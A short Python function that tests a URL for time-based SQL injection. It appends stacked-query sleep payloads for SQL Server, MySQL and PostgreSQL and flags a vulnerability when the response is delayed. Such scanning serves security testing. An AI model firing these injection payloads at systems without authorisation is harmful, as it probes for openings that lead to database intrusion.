def time_based_sql_injection(url):
    import requests as req
    import time

    def time_based(url, payload):
        try:
            start_time = time.time()
            response = req.get(url + payload)
            end_time = time.time()
            if end_time - start_time > 2:  # Adjust the threshold as needed
                return True
            else:
                return False
        except req.RequestException as e:
            print(f"An error occurred: {e}")
            return False

    print("Starting Time-Based SQL Injection Test...")
    payloads = [
        "'; WAITFOR DELAY '00:00:05'-- -",
        "'; SLEEP(5)-- -",
        "'; SELECT pg_sleep(5)-- -"
    ]

    for payload in payloads:
        if time_based(url, payload):
            print(f"Vulnerability found with payload: {payload}")
            return True

    print("No vulnerabilities found.")
    return False